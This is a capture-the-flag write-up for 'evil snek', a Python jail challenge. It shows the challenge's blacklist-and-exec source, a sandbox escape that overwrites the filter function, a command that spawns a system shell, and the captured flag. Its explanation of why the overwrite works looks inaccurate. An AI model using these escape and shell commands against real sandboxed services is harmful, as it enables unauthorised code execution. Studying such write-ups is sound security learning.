# 🐍 evil snek — WWF CTF 2025

## 📌 Challenge Info
- **Name:** evil snek
- **Category:** Python Sandbox / Jail Escape
- **Points:** ?
- **CTF:** WWF CTF 2025  
- **Host:** `chal.wwctf.com:4000`

---

## 📄 Challenge Description
You're stuck inside the most evil snek 🐍. Every word you want to say is blocked. But snek listens if you're smart enough.

---

## 🔍 Provided Code
```python
#!/usr/bin/python3

def blacklist(cmd):
    if cmd.isascii() == False:
        return True
    
    bad_cmds = ['"', "'", "print", "_", "import", "os", "lambda", "system", 
                "(", ")", ".", "getattr", "setattr", "globals", "builtins", 
                "input", "compile", "eval", "exec", "open", "read"]
    
    for i in bad_cmds:
        if i in cmd:
            print("Blacklisted command found:", i)
            return True
    
    return False

while True:
    inp = input("> ")
    if not blacklist(inp):
        try:
            exec(inp)
        except Exception as e:
            print("snek says: Error!")
            exit(0)
    else:
        print("snek says: Blacklisted!")
        exit(0)
```

## 🧪 Analysis
- A strict blacklist prevents usage of dangerous keywords or characters (e.g., `"`, `'`, `_`, `.`, `(`, `)`, etc.)
- However, there's **no real sandboxing** — just a function called `blacklist()` that checks input
- Input is then passed directly to `exec()` if it passes the blacklist check
- **Critical vulnerability**: The `blacklist` function itself can be overwritten!

## 💥 Exploitation Strategy
The blacklist was strict — but **not enforced at runtime**. It simply checked whether the command contains banned strings.

**The trick?** Overwrite the `blacklist` function itself with a non-blacklisted callable that always returns `False`.

## 🧠 Step-by-Step Exploit

### 1. Connect to the challenge:
```bash
nc chal.wwctf.com 4000
```

### 2. Overwrite the `blacklist` function:
```python
> blacklist = callable
```
✅ This bypasses the blacklist completely, because `blacklist` is no longer a filtering function. The `callable` builtin always returns a boolean, and when used in the `if not blacklist(inp):` check, it effectively disables filtering.

### 3. Now you can run *any* code:
```python
> __import__("os").system("sh")
```

### 4. Spawned shell:
```bash
$ ls
flag.txt  run
$ cat flag.txt
```

## 🏁 Flag
```
wwf{s1lly_sn3k_1_just_0verwr1t3_y0ur_funct10n}